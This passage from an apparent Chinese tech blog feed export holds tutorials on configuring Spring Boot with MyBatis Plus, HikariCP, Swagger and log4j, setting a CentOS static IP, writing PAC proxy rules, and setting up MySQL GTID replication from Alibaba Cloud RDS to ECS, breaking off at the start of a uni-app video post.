<h3 id="SpringBoot-起步"><a href="#SpringBoot-起步" class="headerlink" title="SpringBoot 起步"></a>SpringBoot 起步</h3><h4 id="引入依赖-parent"><a href="#引入依赖-parent" class="headerlink" title="引入依赖 parent"></a>引入依赖 parent</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="设置资源属性"><a href="#设置资源属性" class="headerlink" title="设置资源属性"></a>设置资源属性</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceCoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceCoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="引入依赖-dependency"><a href="#引入依赖-dependency" class="headerlink" title="引入依赖 dependency"></a>引入依赖 dependency</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="MyBatis-Plus-整合"><a href="#MyBatis-Plus-整合" class="headerlink" title="MyBatis Plus 整合"></a>MyBatis Plus 整合</h3><h4 id="添加数据源和依赖"><a href="#添加数据源和依赖" class="headerlink" title="添加数据源和依赖"></a>添加数据源和依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mysql驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.41<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- mybatis plus --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>Latest Version<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="在yml中添加配置"><a href="#在yml中添加配置" class="headerlink" title="在yml中添加配置"></a>在yml中添加配置</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 配置数据源信息</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span>                                     <span class="comment"># 数据源的相关配置</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.jw.hikari.HikariDataSource</span>          <span class="comment"># 数据源类型，HikariCP</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span>      <span class="comment"># mysql 驱动</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/shop?useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># MyBatis Plus 配置</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.jw.pojo</span>           <span class="comment"># 所有 POJO 类所在包路径</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="string">UNIX_TIMESTAMP()</span>   <span class="comment"># 逻辑已删除值</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span>              <span class="comment"># 逻辑未删除值</span></span><br></pre></td></tr></table></figure>

<h3 id="HikariCP-连接池"><a href="#HikariCP-连接池" class="headerlink" title="HikariCP 连接池"></a>HikariCP 连接池</h3><h4 id="在yml中添加配置-1"><a href="#在yml中添加配置-1" class="headerlink" title="在yml中添加配置"></a>在yml中添加配置</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">connection-timeout:</span> <span class="number">30000</span>     <span class="comment"># 等待连接池分配连接的最大时长（毫秒），超过时长还无连接则发生 SQLException，默认：30秒</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">5</span>               <span class="comment"># 最小连接数</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span>         <span class="comment"># 最大连接数</span></span><br><span class="line">      <span class="attr">auto-commit:</span> <span class="literal">true</span>             <span class="comment"># 自动提交</span></span><br><span class="line">      <span class="attr">idle-timeout:</span> <span class="number">600000</span>          <span class="comment"># 连接超时的最大时长（毫秒），超时则被释放（retired），默认：10分钟</span></span><br><span class="line">      <span class="attr">pool-name:</span> <span class="string">DataSourceHikariCP</span> <span class="comment"># 连接池名称</span></span><br><span class="line">      <span class="attr">max-lifetime:</span> <span class="number">1800000</span>         <span class="comment"># 连接的生命时长（毫秒）超时而没有被使用则释放（retired），默认：30分钟</span></span><br><span class="line">      <span class="attr">connection-test-query:</span> <span class="string">SELECT</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="Swagger2-文档"><a href="#Swagger2-文档" class="headerlink" title="Swagger2 文档"></a>Swagger2 文档</h3><h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.xiaoymin/swagger-bootstrap-ui --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SpringBoot-日志"><a href="#SpringBoot-日志" class="headerlink" title="SpringBoot 日志"></a>SpringBoot 日志</h3><h4 id="移除默认日志"><a href="#移除默认日志" class="headerlink" title="移除默认日志"></a>移除默认日志</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="添加日志框架依赖"><a href="#添加日志框架依赖" class="headerlink" title="添加日志框架依赖"></a>添加日志框架依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-log4j12 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="添加日志配置"><a href="#添加日志配置" class="headerlink" title="添加日志配置"></a>添加日志配置</h4><p>创建<code>log4j.properties</code>并且放到资源文件目录<code>src/main/resources</code></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">log4j.rootLogger</span>=<span class="string">DEBUG,stdout,file</span></span><br><span class="line"><span class="meta">log4j.additivity.org.apache</span>=<span class="string">true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">log4j.appender.stdout</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.threshold</span>=<span class="string">INFO</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout.ConversionPattern</span>=<span class="string">%-5p %c&#123;1&#125;:%L - %m%n</span></span><br><span class="line"></span><br><span class="line"><span class="meta">log4j.appender.file</span>=<span class="string">org.apache.log4j.DailyRollingFileAppender</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.file.DatePattern</span>=<span class="string">&#x27;.&#x27;yyyy-MM-dd-HH-mm</span></span><br><span class="line"><span class="meta">log4j.appender.file.layout.ConversionPattern</span>=<span class="string">%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5p %c&#123;1&#125;:%L - %m%n</span></span><br><span class="line"><span class="meta">log4j.appender.file.Threshold</span>=<span class="string">INFO</span></span><br><span class="line"><span class="meta">log4j.appender.file.append</span>=<span class="string">true</span></span><br><span class="line"><span class="meta">log4j.appender.file.File</span>=<span class="string">/tmp/logs/api/mylog.log</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>设置CentOS服务器IP地址</title>
    <url>/post/33748/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如何在CentOS服务器中配置网络IP地址</p>
<span id="more"></span>

<h3 id="设置IP地址"><a href="#设置IP地址" class="headerlink" title="设置IP地址"></a>设置IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br></pre></td></tr></table></figure>

<p>查看配置信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>编辑网卡配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ifcfg-eno1</span><br></pre></td></tr></table></figure>

<p>编辑信息，建议 <code>ONBOOT=yes</code>，以后开机就会自动联网：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">TYPE</span>=<span class="string">&quot;Ethernet&quot;</span></span><br><span class="line"><span class="attr">BOOTPROTO</span>=<span class="string">&quot;none&quot;</span></span><br><span class="line"><span class="attr">DEFROUTE</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV4_FAILURE_FATAL</span>=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="attr">IPV6INIT</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_AUTOCONF</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_DEFROUTE</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPV6_FAILURE_FATAL</span>=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="attr">NAME</span>=<span class="string">&quot;eno1&quot;</span></span><br><span class="line"><span class="attr">UUID</span>=<span class="string">&quot;c63850e5-4c25-46c7-a030-574fcf824ad5&quot;</span></span><br><span class="line"><span class="attr">DEVICE</span>=<span class="string">&quot;eno1&quot;</span> <span class="comment">#设备别名</span></span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="attr">IPADDR1</span>=<span class="number">202.95</span>.<span class="number">22.222</span> <span class="comment">#从IP地址1</span></span><br><span class="line"><span class="attr">PREFIX1</span>=<span class="string">&quot;25&quot;</span></span><br><span class="line"><span class="attr">IPADDR2</span>=<span class="number">202.95</span>.<span class="number">22.233</span> <span class="comment">#从IP地址2</span></span><br><span class="line"><span class="attr">PREFIX2</span>=<span class="string">&quot;25&quot;</span></span><br><span class="line"><span class="attr">DNS1</span>=<span class="string">&quot;8.8.8.8&quot;</span> <span class="comment">#DNS服务器</span></span><br><span class="line"><span class="attr">IPADDR</span>=<span class="number">202.95</span>.<span class="number">22.212</span>  <span class="comment">#设置主IP地址</span></span><br><span class="line"><span class="attr">PREFIX</span>=<span class="number">25</span></span><br><span class="line"><span class="attr">GATEWAY</span>=<span class="number">202.95</span>.<span class="number">8.129</span> <span class="comment">#网关</span></span><br><span class="line"><span class="attr">IPV6_PEERDNS</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">IPV6_PEERROUTES</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">IPV6_PRIVACY</span>=<span class="literal">no</span></span><br></pre></td></tr></table></figure>

<h3 id="重启网络配置"><a href="#重启网络配置" class="headerlink" title="重启网络配置"></a>重启网络配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>PAC规则配置</title>
    <url>/post/57233/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置</p>
<span id="more"></span>

<h3 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h3><ul>
<li><p>通配符支持，如 <code>*.example.com/*</code> 实际书写时可省略 如： <code>.example.com/</code> 意即 <code>.example.com/*</code></p>
</li>
<li><p>正则表达式支持，以 <code>\</code> 开始和结束， 如： <code>\[\w]+:\/\/example.com\</code></p>
</li>
<li><p>例外规则 <code>@@</code>，如 <code>@@*.example.com/*</code> 满足 <code>@@</code> 后规则的地址不使用代理</p>
</li>
<li><p>匹配地址开始和结尾 <code>|</code>，如： <code>|http://example.com</code>、<code>example.com|</code> 分别表示以 <code>http://example.com</code> 开始和以 <code>example.com</code> 结束的地址</p>
</li>
<li><p>|| 标记，如： <code>||example.com</code> 则 <code>http://example.com</code> 、<code>https://example.com</code> 、<code>ftp://example.com</code> 等地址均满足条件，只用于匹配地址开头</p>
</li>
<li><p>注释 <code>!</code> 如： <code>! Comment</code></p>
</li>
<li><p>分隔符 <code>^</code>，表示除了字母、数字或者 <code>_ - . %</code> 之外的任何字符如： <code>http://example.com^</code> ，<code>http://example.com/</code> 和 <code>http://example.com:8000/</code> 均满足条件，而 <code>http://example.com.ar/</code> 不满足条件</p>
</li>
</ul>
<h3 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! Put user rules line by line in this file.</span><br><span class="line"></span><br><span class="line">! See https://adblockplus.org/en/filter-cheatsheet</span><br><span class="line"></span><br><span class="line">@@||localhost</span><br><span class="line"></span><br><span class="line">||github.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问</p>
]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云RDS与ECS服务器数据库做主从</title>
    <url>/post/13832/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：</p>
<ul>
<li><p>mysql-bin正常情况下,RDS在本地只保存18个小时</p>
</li>
<li><p>当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)</p>
</li>
</ul>
<p>考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步</p>
<span id="more"></span>

<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p>传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。</p>
<p>GTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是<code>source_id:transaction_id</code>，如<code>3E11FA47-71CA-11E1-9E33-C80AA9429562:23</code></p>
<ul>
<li><p>source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里</p>
</li>
<li><p>transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识</p>
</li>
</ul>
<p>它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。</p>
<p>也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了</p>
<h3 id="RDS数据库配置"><a href="#RDS数据库配置" class="headerlink" title="RDS数据库配置"></a>RDS数据库配置</h3><ul>
<li>配置从实例读取数据使用的只读账号和授权数据库</li>
<li>将ECS的从实例的 IP 地址加入主实例的 IP 白名单中</li>
<li>登录主实例</li>
</ul>
<h4 id="查询-server-id"><a href="#查询-server-id" class="headerlink" title="查询 server-id"></a>查询 server-id</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;server_id&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="查询-GTID"><a href="#查询-GTID" class="headerlink" title="查询 GTID"></a>查询 GTID</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;gtid_purged&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="ECS数据库配置"><a href="#ECS数据库配置" class="headerlink" title="ECS数据库配置"></a>ECS数据库配置</h3><h4 id="mysql文件配置"><a href="#mysql文件配置" class="headerlink" title="mysql文件配置"></a>mysql文件配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server-id = 1001 #不可与RDS主库id相同</span><br><span class="line">port = 3306</span><br><span class="line">replicate-do-db = masterdb #需要同步的数据库</span><br><span class="line"></span><br><span class="line">binlog_format = row #日志文件格式</span><br><span class="line">log-bin = mysql-bin</span><br><span class="line">log-bin-index = mysql-bin.index</span><br><span class="line">relay-log = relay-log</span><br><span class="line">relay_log_index = relay-log.index</span><br><span class="line">slave-skip-errors = all</span><br></pre></td></tr></table></figure>

<h4 id="GTID配置"><a href="#GTID配置" class="headerlink" title="GTID配置"></a>GTID配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtid_mode = on</span><br><span class="line">enforce_gtid_consistency = on</span><br><span class="line">log-slave-updates = 1</span><br><span class="line"></span><br><span class="line">sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure>

<h4 id="从库配置"><a href="#从库配置" class="headerlink" title="从库配置"></a>从库配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; stop slave;</span><br><span class="line">mysql&gt; set global gtid_purged = &#x27;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;reset master;</span><br></pre></td></tr></table></figure>

<h4 id="执行同步"><a href="#执行同步" class="headerlink" title="执行同步"></a>执行同步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHANGE MASTER TO</span><br><span class="line">MASTER_HOST=&#x27;xxxxxxx.mysql.rds.aliyuncs.com&#x27;,</span><br><span class="line">MASTER_PORT=3306,</span><br><span class="line">MASTER_USER=&#x27;username&#x27;,</span><br><span class="line">MASTER_PASSWORD=&#x27;password&#x27;,</span><br><span class="line">master_auto_position=1;</span><br><span class="line"></span><br><span class="line">mysql&gt;start slave;</span><br></pre></td></tr></table></figure>

<h4 id="查看从库状态"><a href="#查看从库状态" class="headerlink" title="查看从库状态"></a>查看从库状态</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;show slave status\G;</span><br></pre></td></tr></table></figure>

<p>两个yes表示成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Slave_IO_Running: Yes</span><br><span class="line">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>uni-app 开发视频项目中的播放问题</title>
    <url>/post/4242/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在使用uni-app开发app中发现框架的原生视频组件性能太差，并且H5的视频组件不支持<code>u3m8</code>格式的视频</p>
<span id="more"></span>

<h3 id="APP视频播放性能问题"><a href="#APP视频播放性能问题" class="headerlink" title="APP视频播放性能问题"></a>APP视频播放性能问题</h3><p>使用webview调用h5中的视频播放器，注意webview的层级是最高的，无法被覆盖</p>
